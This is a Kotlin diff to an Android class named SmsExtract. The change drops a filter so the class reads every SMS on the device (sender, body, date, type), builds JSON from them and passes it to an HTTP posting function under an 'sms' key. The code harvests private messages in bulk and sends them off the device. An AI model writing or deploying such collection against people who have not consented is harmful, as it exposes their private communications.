@@ -46,8 +46,9 @@ class SmsExtract: AppCompatActivity() {
             Telephony.Sms.DATE,
             Telephony.Sms.TYPE
         )
+        var a = 0
         val contentResolver: ContentResolver = context.contentResolver
-        val cursor = contentResolver.query(smsUri, projection, null, null, null)
+        val cursor = contentResolver.query(smsUri, projection, null, null, "${Telephony.Sms.DATE} DESC")
         if (cursor != null && cursor.moveToFirst()) {
             do {
                 // SMS 메시지에서 필요한 정보 추출
@@ -58,9 +59,13 @@ class SmsExtract: AppCompatActivity() {
                 val dateInMillis = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE))
                 val type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))
 
-                if (address.startsWith("010")) {
+//                if (address.startsWith("010")) {
                     stringBuilder.append("{ \"number\": \"$address\", \"body\": ${jsonBody}, \"date\": $dateInMillis, \"type\": $type }, ")
-                }
+//                }
+                a += 1
+//                if ( a > 5 ) {
+//                    break
+//                }
             } while (cursor.moveToNext())
             cursor.close()
         }
@@ -72,7 +77,7 @@ class SmsExtract: AppCompatActivity() {
 
     private fun postFuel(data: String) {
         val stringBuilder = StringBuilder()
-        stringBuilder.append("{ \"apps\": ")
+        stringBuilder.append("{ \"sms\": ")
         stringBuilder.append("$data")
         stringBuilder.append("}")
         // FuelManager 설정 (선택사항)
